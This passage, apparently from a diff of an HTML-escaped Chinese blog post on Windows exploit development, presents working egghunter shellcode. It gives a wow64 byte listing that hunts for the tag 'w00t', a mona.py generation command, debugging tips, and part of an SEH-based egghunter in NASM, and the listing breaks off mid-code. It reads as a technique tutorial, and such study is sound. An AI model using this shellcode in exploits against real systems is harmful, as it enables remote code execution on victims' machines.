+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x53&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x53&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x53&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x53&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x6A&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x29&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;系统调用&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x58&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;POP&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EAX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;xB3&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xC0&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;BL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;C0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x64&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xFF&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x13&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;          &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;CALL&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;FS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x83&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xC4&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x10&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;          &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ADD&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ESP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x5A&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;POP&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x3C&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x05&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;CMP&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;AL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x74&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xE3&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;JE&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SHORT&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;xB8&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x77&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x30&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x30&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x74&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EAX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;74303077&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;w00t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x8B&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xFA&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDI&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;xAF&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SCAS&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EDI&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x75&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xDE&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;JNZ&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SHORT&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;xAF&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SCAS&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EDI&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x75&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xDB&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;JNZ&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SHORT&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;xFF&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xE7&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;JMP&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDI&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该Egghunter可通过mona.py生成：&lt;code&gt;!mona egg -wow64 -winver 10&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;调试技巧&#34;&gt;调试技巧
+&lt;/h2&gt;&lt;p&gt;调试时需配置调试器忽略以下异常：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;0xC0000005 - 访问冲突&lt;/li&gt;
+&lt;li&gt;0x80000001 - 保护页冲突&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;基于seh的通用egghunter&#34;&gt;基于SEH的通用Egghunter
+&lt;/h2&gt;&lt;p&gt;作者进一步探索了不依赖系统调用的SEH（结构化异常处理）方案，该方案理论上可跨Windows版本和架构工作：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; 通用SEH Egghunter（x86和wow64）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;BITS&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;CALL&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;RET&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POP&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ECX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;ADD&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ECX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1d&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; 设置SEH记录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;XOR&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ECX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ECX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x90c3585c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x44444444&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; 替换为POP/POP/RET地址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x04EB5858&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;FS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ESP&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;JMP&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;nextpage&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;handle:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;SUB&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ESP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x14&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;XOR&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;FS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ESP&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ESP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;INC&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;nextpage:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;DX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0FFF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;INC&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ESP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EAX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x74303077&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDI&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;SCASD&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;JNZ&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;nextpage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;SCASD&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;JNZ&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;nextpage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;
